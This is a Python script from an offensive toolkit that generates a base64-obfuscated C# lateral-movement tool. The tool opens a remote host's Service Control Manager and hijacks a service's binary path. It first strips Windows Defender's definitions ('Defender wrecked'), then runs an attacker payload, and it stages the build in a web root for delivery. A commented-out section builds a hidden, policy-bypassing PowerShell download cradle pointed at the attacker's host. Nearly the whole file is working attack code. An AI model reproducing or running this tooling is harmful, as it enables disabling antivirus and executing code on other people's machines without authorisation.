import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,powershell_b64encode,makeoneliner,cradleps1
from makerunspace import certutil_b64encode
from makerdpthief import makecombo_rdpthief as makecombo_lat

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

devhost = "192.168.135.7"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writelat(bitness,lhost,lport,ptype,binary,targethost,jitcompile,bypass,service):
    latfilename = "Lat.cs"

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpuYW1lc3BhY2UgTm9Qc0V4ZWMKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEJlc3RGaXRNYXBwaW5nID0gZmFsc2UsIFRocm93T25Vbm1hcHBhYmxlQ2hhciA9IHRydWUpXQogICAgICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgICAgIGludGVybmFsIHN0YXRpYyBleHRlcm4gYm9vbCBMb2dvblVzZXIoCiAgICAgICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildIHN0cmluZyBscHN6VXNlcm5hbWUsCiAgICAgICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildIHN0cmluZyBscHN6RG9tYWluLAogICAgICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBTdHIpXSBzdHJpbmcgbHBzelBhc3N3b3JkLAogICAgICAgICAgICBpbnQgZHdMb2dvblR5cGUsCiAgICAgICAgICAgIGludCBkd0xvZ29uUHJvdmlkZXIsCiAgICAgICAgICAgIHJlZiBJbnRQdHIgcGhUb2tlbgogICAgICAgICAgICApOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoSW50UHRyIGhUb2tlbik7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgUXVlcnlTZXJ2aWNlQ29uZmlnKEludFB0ciBzZXJ2aWNlLCBJbnRQdHIgcXVlcnlTZXJ2aWNlQ29uZmlnLCBpbnQgYnVmZmVyU2l6ZSwgcmVmIGludCBieXRlc05lZWRlZCk7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiT3BlblNDTWFuYWdlclciLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5TQ01hbmFnZXIoc3RyaW5nIG1hY2hpbmVOYW1lLCBzdHJpbmcgZGF0YWJhc2VOYW1lLCB1aW50IGR3QWNjZXNzKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblNlcnZpY2UoSW50UHRyIGhTQ01hbmFnZXIsIHN0cmluZyBscFNlcnZpY2VOYW1lLCB1aW50IGR3RGVzaXJlZEFjY2Vzcyk7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiQ2hhbmdlU2VydmljZUNvbmZpZyIpXQogICAgICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2hhbmdlU2VydmljZUNvbmZpZ0EoSW50UHRyIGhTZXJ2aWNlLCB1aW50IGR3U2VydmljZVR5cGUsIGludCBkd1N0YXJ0VHlwZSwgaW50IGR3RXJyb3JDb250cm9sLCBzdHJpbmcgbHBCaW5hcnlQYXRoTmFtZSwgc3RyaW5nIGxwTG9hZE9yZGVyR3JvdXAsIHN0cmluZyBscGR3VGFnSWQsIHN0cmluZyBscERlcGVuZGVuY2llcywgc3RyaW5nIGxwU2VydmljZVN0YXJ0TmFtZSwgc3RyaW5nIGxwUGFzc3dvcmQsIHN0cmluZyBscERpc3BsYXlOYW1lKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFN0YXJ0U2VydmljZShJbnRQdHIgaFNlcnZpY2UsIGludCBkd051bVNlcnZpY2VBcmdzLCBzdHJpbmdbXSBscFNlcnZpY2VBcmdWZWN0b3JzKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBHZXRMYXN0RXJyb3IoKTsKICAgICAgICBwdWJsaWMgZW51bSBBQ0NFU1NfTUFTSyA6IHVpbnQKICAgICAgICB7CiAgICAgICAgICAgIFNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCA9IDB4MDAwRjAwMDAsCiAgICAgICAgICAgIFNUQU5EQVJEX1JJR0hUU19SRUFEID0gMHgwMDAyMDAwMCwKICAgICAgICAgICAgU1RBTkRBUkRfUklHSFRTX1dSSVRFID0gMHgwMDAyMDAwMCwKICAgICAgICAgICAgU1RBTkRBUkRfUklHSFRTX0VYRUNVVEUgPSAweDAwMDIwMDAwLAogICAgICAgIH0KCiAgICAgICAgcHVibGljIGVudW0gU0NNX0FDQ0VTUyA6IHVpbnQKICAgICAgICB7CiAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCA9IDB4MDAwMDEsCiAgICAgICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgPSAweDAwMDAyLAogICAgICAgICAgICBTQ19NQU5BR0VSX0VOVU1FUkFURV9TRVJWSUNFID0gMHgwMDAwNCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9MT0NLID0gMHgwMDAwOCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9RVUVSWV9MT0NLX1NUQVRVUyA9IDB4MDAwMTAsCiAgICAgICAgICAgIFNDX01BTkFHRVJfTU9ESUZZX0JPT1RfQ09ORklHID0gMHgwMDAyMCwKICAgICAgICAgICAgU0NfTUFOQUdFUl9BTExfQUNDRVNTID0gQUNDRVNTX01BU0suU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0NSRUFURV9TRVJWSUNFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfRU5VTUVSQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9MT0NLIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfUVVFUllfTE9DS19TVEFUVVMgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9NT0RJRllfQk9PVF9DT05GSUcsCgogICAgICAgICAgICBHRU5FUklDX1JFQUQgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfUkVBRCB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0VOVU1FUkFURV9TRVJWSUNFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfUVVFUllfTE9DS19TVEFUVVMsCgogICAgICAgICAgICBHRU5FUklDX1dSSVRFID0gQUNDRVNTX01BU0suU1RBTkRBUkRfUklHSFRTX1dSSVRFIHwKICAgICAgICAgICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICAgICAgU0NfTUFOQUdFUl9NT0RJRllfQk9PVF9DT05GSUcsCgogICAgICAgICAgICBHRU5FUklDX0VYRUNVVEUgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfRVhFQ1VURSB8CiAgICAgICAgICAgICAgICBTQ19NQU5BR0VSX0NPTk5FQ1QgfCBTQ19NQU5BR0VSX0xPQ0ssCgogICAgICAgICAgICBHRU5FUklDX0FMTCA9IFNDX01BTkFHRVJfQUxMX0FDQ0VTUywKICAgICAgICB9CiAgICAgICAgcHVibGljIGVudW0gU0VSVklDRV9BQ0NFU1MgOiB1aW50CiAgICAgICAgewogICAgICAgICAgICBTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgPSAweEYwMDAwLAogICAgICAgICAgICBTRVJWSUNFX1FVRVJZX0NPTkZJRyA9IDB4MDAwMDEsCiAgICAgICAgICAgIFNFUlZJQ0VfQ0hBTkdFX0NPTkZJRyA9IDB4MDAwMDIsCiAgICAgICAgICAgIFNFUlZJQ0VfUVVFUllfU1RBVFVTID0gMHgwMDAwNCwKICAgICAgICAgICAgU0VSVklDRV9FTlVNRVJBVEVfREVQRU5ERU5UUyA9IDB4MDAwMDgsCiAgICAgICAgICAgIFNFUlZJQ0VfU1RBUlQgPSAweDAwMDEwLAogICAgICAgICAgICBTRVJWSUNFX1NUT1AgPSAweDAwMDIwLAogICAgICAgICAgICBTRVJWSUNFX1BBVVNFX0NPTlRJTlVFID0gMHgwMDA0MCwKICAgICAgICAgICAgU0VSVklDRV9JTlRFUlJPR0FURSA9IDB4MDAwODAsCiAgICAgICAgICAgIFNFUlZJQ0VfVVNFUl9ERUZJTkVEX0NPTlRST0wgPSAweDAwMTAwLAogICAgICAgICAgICBTRVJWSUNFX0FMTF9BQ0NFU1MgPSAoU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9RVUVSWV9DT05GSUcgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX0NIQU5HRV9DT05GSUcgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1FVRVJZX1NUQVRVUyB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfRU5VTUVSQVRFX0RFUEVOREVOVFMgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1NUQVJUIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9TVE9QIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0VSVklDRV9QQVVTRV9DT05USU5VRSB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfSU5URVJST0dBVEUgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1VTRVJfREVGSU5FRF9DT05UUk9MKQogICAgICAgIH0KICAgICAgICBwcml2YXRlIHN0cnVjdCBRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgc2VydmljZVR5cGU7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgc3RhcnRUeXBlOwogICAgICAgICAgICBwdWJsaWMgaW50IGVycm9yQ29udHJvbDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBiaW5hcnlQYXRoTmFtZTsKICAgICAgICAgICAgcHVibGljIEludFB0ciBsb2FkT3JkZXJHcm91cDsKICAgICAgICAgICAgcHVibGljIGludCB0YWdJRDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBkZXBlbmRlbmNpZXM7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgc3RhcnROYW1lOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGRpc3BsYXlOYW1lOwogICAgICAgIH0KCiAgICAgICAgY29uc3QgdWludCBTRVJWSUNFX05PX0NIQU5HRSA9IDB4ZmZmZmZmZmY7CiAgICAgICAgY29uc3QgaW50IFNFUlZJQ0VfREVNQU5EX1NUQVJUID0gMHgwMDAwMDAwMzsKICAgICAgICBjb25zdCBpbnQgU0VSVklDRV9FUlJPUl9JR05PUkUgPSAweDAwMDAwMDAwOwogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIGludCBieXRlc05lZWRlZCA9IDU7IAogICAgICAgICAgICBib29sIGJSZXN1bHQgPSBmYWxzZTs="
    tmid = "ICAgICAgICAgICAgSW50UHRyIFNDTUhhbmRsZSA9IE9wZW5TQ01hbmFnZXIodGFyZ2V0LCBudWxsLCAodWludClTQ01fQUNDRVNTLlNDX01BTkFHRVJfQUxMX0FDQ0VTUyk7CiAgICAgICAgICAgIGlmIChTQ01IYW5kbGUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gT3BlblNDTWFuYWdlckEgZmFpbGVkISBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU0NfSEFORExFIE1hbmFnZXIgMHh7MH0iLCBTQ01IYW5kbGUpOw=="
    smid = "ICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBPcGVuaW5nIHNlcnZpY2U6IHswfSIsIFNlcnZpY2VOYW1lKTsKICAgICAgICAgICAgSW50UHRyIHNjaFNlcnZpY2UgPSBPcGVuU2VydmljZShTQ01IYW5kbGUsIFNlcnZpY2VOYW1lLCAoKHVpbnQpU0VSVklDRV9BQ0NFU1MuU0VSVklDRV9BTExfQUNDRVNTKSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU0NfSEFORExFIFNlcnZpY2UgMHh7MH0iLCBzY2hTZXJ2aWNlKTsKCiAgICAgICAgICAgIFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCBxc2NzID0gbmV3IFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCgpOwogICAgICAgICAgICBJbnRQdHIgcXNjUHRyID0gTWFyc2hhbC5BbGxvY0NvVGFza01lbSgwKTsKICAgICAgICAgICAgaW50IHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCAwLCByZWYgYnl0ZXNOZWVkZWQpOwogICAgICAgICAgICBpZiAocmV0Q29kZSA9PSAwICYmIGJ5dGVzTmVlZGVkID09IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gUXVlcnlTZXJ2aWNlQ29uZmlnIGZhaWxlZCB0byByZWFkIHRoZSBzZXJ2aWNlIHBhdGguIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gTFBRVUVSWV9TRVJWSUNFX0NPTkZJR0EgbmVlZCB7MH0gYnl0ZXMiLCBieXRlc05lZWRlZCk7CiAgICAgICAgICAgICAgICBxc2NQdHIgPSBNYXJzaGFsLkFsbG9jQ29UYXNrTWVtKGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgICAgIHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCBieXRlc05lZWRlZCwgcmVmIGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgICAgIHFzY3MuYmluYXJ5UGF0aE5hbWUgPSBJbnRQdHIuWmVybzsKCiAgICAgICAgICAgICAgICBxc2NzID0gKFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdClNYXJzaGFsLlB0clRvU3RydWN0dXJlKHFzY1B0ciwgbmV3IFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCgpLkdldFR5cGUoKSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHN0cmluZyBvcmlnaW5hbEJpbmFyeVBhdGggPSBNYXJzaGFsLlB0clRvU3RyaW5nQXV0byhxc2NzLmJpbmFyeVBhdGhOYW1lKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBPcmlnaW5hbCBzZXJ2aWNlIGJpbmFyeSBwYXRoIFwiezB9XCIiLCBvcmlnaW5hbEJpbmFyeVBhdGgpOwogICAgICAgICAgICBNYXJzaGFsLkZyZWVDb1Rhc2tNZW0ocXNjUHRyKTsKICAgICAgICAgICAgc3RyaW5nIHNpZ25hdHVyZSA9ICJcIkM6XFxQcm9ncmFtIEZpbGVzXFxXaW5kb3dzIERlZmVuZGVyXFxNcENtZFJ1bi5leGVcIiAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbCI7CiAgICAgICAgICAgIGJSZXN1bHQgPSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQShzY2hTZXJ2aWNlLCBTRVJWSUNFX05PX0NIQU5HRSwgU0VSVklDRV9ERU1BTkRfU1RBUlQsIFNFUlZJQ0VfRVJST1JfSUdOT1JFLCBzaWduYXR1cmUsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHVwZGF0ZSB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbKl0gU2VydmljZSBwYXRoIGNoYW5nZWQgdG8gXCJ7MH1cIiIsIHNpZ25hdHVyZSk7CiAgICAgICAgICAgIGJSZXN1bHQgPSBTdGFydFNlcnZpY2Uoc2NoU2VydmljZSwgMCwgbnVsbCk7CiAgICAgICAgICAgIHVpbnQgZHdSZXN1bHQgPSBHZXRMYXN0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFiUmVzdWx0ICYmIGR3UmVzdWx0ICE9IDEwNTMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gU3RhcnRTZXJ2aWNlQSBmYWlsZWQgdG8gc3RhcnQgdGhlIHNlcnZpY2UuIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIERlZmVuZGVyIHdyZWNrZWQiKTsKICAgICAgICAgICAgfQ=="
    lower = "ICAgICAgICAgICAgYlJlc3VsdCA9IENoYW5nZVNlcnZpY2VDb25maWdBKHNjaFNlcnZpY2UsIFNFUlZJQ0VfTk9fQ0hBTkdFLCBTRVJWSUNFX0RFTUFORF9TVEFSVCwgU0VSVklDRV9FUlJPUl9JR05PUkUsIHBheWxvYWQsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHVwZGF0ZSB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU2VydmljZSBwYXRoIGNoYW5nZWQgdG8gXCJ7MH1cIiIsIHBheWxvYWQpOwogICAgICAgICAgICBiUmVzdWx0ID0gU3RhcnRTZXJ2aWNlKHNjaFNlcnZpY2UsIDAsIG51bGwpOwogICAgICAgICAgICBkd1Jlc3VsdCA9IEdldExhc3RFcnJvcigpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQgJiYgZHdSZXN1bHQgIT0gMTA1MykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBTdGFydFNlcnZpY2VBIGZhaWxlZCB0byBzdGFydCB0aGUgc2VydmljZS4gRXJyb3I6ezB9IiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCgwKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU2VydmljZSBzdGFydGVkIik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGJSZXN1bHQgPSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQShzY2hTZXJ2aWNlLCBTRVJWSUNFX05PX0NIQU5HRSwgU0VSVklDRV9ERU1BTkRfU1RBUlQsIFNFUlZJQ0VfRVJST1JfSUdOT1JFLCBvcmlnaW5hbEJpbmFyeVBhdGgsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHJldmVydCB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBTZXJ2aWNlIHBhdGggcmVzdG9yZWQgdG8gXCJ7MH1cIiIsIG9yaWdpbmFsQmluYXJ5UGF0aCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0="

    targetdata = "string target = \"%s\";" % targethost
    servicedata = "string ServiceName = \"%s\";" % service

    if ptype == "local":
        if binary == "0":
            print('[!] woops! -t local without binary (localised run.txt) not supported! terminating!')
            sys.exit()
            if bypass == "0":
                #localised run.txt, probably won't work from makepipepipe experience
                pass
            if bypass != "0":
                if bypass == "run":
                    #makerunspace bypass of local hollow
                    pass
                if bypass == "com":
                    #makecompile bypass of local hollow
                    pass
        else:
            if bypass == "0":
                paydata = "string payload = \"%s\";" % (binary)
                #regular bin activation
            if bypass != "0":
                if bypass == "run":
                    print('[*] -k run chosen -> use makerunspace! cmd:')
                    binary = binary.replace('\\\\','\\')
                    print('python3 makerunspace.py -a %s -l %s -p %s -b Lat -n %s -s %s -c \'%s\'' % (bitness,lhost,lport,targethost,service,binary)) 
                    sys.exit()
                    #makerunspace bypass of specified binary
                    pass
                if bypass == "com":
                    print('[*] -k com chosen -> use makecompile! cmd:')
                    binary = binary.replace('\\\\','\\')
                    print('python3 makecompile.py -a %s -l %s -p %s -t local -b Lat -n %s -s %s -c \'%s\'' % (bitness,lhost,lport,targethost,service,binary)) 
                    sys.exit()
                    #makecompile bypass of specified binary
                    pass
                pass
            pass
        pass

    if ptype == "remote":
        if binary == "0":
            print('[!] halt! Lat with powershell run.txt doesn\'t seem to work. target a binary! terminating!')
            sys.exit()
            if bypass == "0":
                '''
                runnerfilename = runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runnerfilename)
                target = "http://%s/%s" % (lhost,runnerfilename)
                target = cradle % target
                binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
                binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
                
                paydata = "string payload = \"%s%s\";" % (binname,binargs)
                '''
                pass
            if bypass != "0":
                if bypass == "run":
                    #remote pre-compiled option not yet done #makerunspace bypass
                    pass
                if bypass == "com":
                    #remote pre-compiled option not yet done #makecompile bypass
                    pass
        else:
            print('[!] woops! -t remote with pre-compiled binary not yet supported! terminating!')
            sys.exit()
            #remote pre-compiled option not yet done
            pass
        pass

    with open(latfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        tmid = base64.b64decode(tmid).decode() 
        smid = base64.b64decode(smid).decode()        
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + targetdata + "\n")
        f.write(tmid + "\n")
        f.write("            " + servicedata + "\n")
        f.write(smid + "\n")
        f.write("            " + paydata + "\n")
        f.write(lower)
    f.close()

    print('[+] lat cs written: %s' % latfilename)
    return latfilename
    pass

'''
def makecombo_lat(lhost,latfilename,targethost):
    pass
'''

def makelat(bitness,lhost,lport,ptype,binary,targethost,jitcompile,bypass,service):
    if ptype == "local":
        if binary == "0":
            print('[!] no binary specified + local option -> localised run.txt will be used!\n')
            # probably won't work from makepipepipe experience
        if binary != "0":
            if jitcompile == "0":
                if "c:\\" not in binary:
                    print('[!] provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                    sys.exit()
                else:
                    print('[!] local pre-compiled option chosen! make sure victim %s exists!' % binary)
                    binary = binary.replace('\\','\\\\') #prep for csharp
                    # proceed to make lat with binary path
                    pass
            if jitcompile == "1":
                if binary not in ("Inject","Hollow","UACHelper"):
                    if binary == "SharpUp":
                        print('[!] SharpUp only compatible with pre-compiled binary! -t remote! terminating!')
                        sys.exit()
                else:
                    # proceed to compile binary and use bitsadmin+certutil to load on victim
                    pass
                    if obfuscate_bin == "1":
                        pass
            pass

    if ptype == "remote":
        if binary == "0":
            print('[!] no binary specified + remote option -> remote callback to run.txt will be used!\n')
            # proceed to make pipepipe that calls back to run.txt
        if binary != "0":
            if jitcompile == "0":
                if obfuscate_bin == "1":
                    binname = "%s.txt" % binary
                else:
                    binname = "%s.exe" % binary
                #print('[!] remote pre-compiled option chosen! make sure /var/www/html/%s exists!' % binname)
                print('[!] remote pre-compiled option not yet available! terminating!')
                sys.exit()
                # proceed to make pipepipe that calls back to binname - unlikely to work with .exe binaries - but maybe can work with dll!
            if jitcompile == "1":
                if binary not in ("Inject","Hollow","UACHelper"):
                    if binary == "SharpUp":
                        print('[!] SharpUp can\'t be compiled on the fly! use -j 0! terminating!')
                        sys.exit()
                    else:
                        print('[!] remote jit-compiled option not yet available! terminating!')
                        sys.exit()
                        # proceed to compile binary and place in /var/www/html - to explore dll option
                        pass 
                pass
            pass
        pass

    latfilename = writelat(bitness,lhost,lport,ptype,binary,targethost,jitcompile,bypass,service)
    csfilepath = "/home/kali/data/NoPsExec/NoPsExec/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "NoPsExec.exe"

    copy(latfilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_lat(lhost,exefilename)
    pass 

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='remote or local')
    parser.add_argument('--binary','-b',required=False,dest='binary',help='Inject, Hollow') #'any target binary on victim, e.g. c:\\windows\\tasks\\bin.exe') #, or Runspace')
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
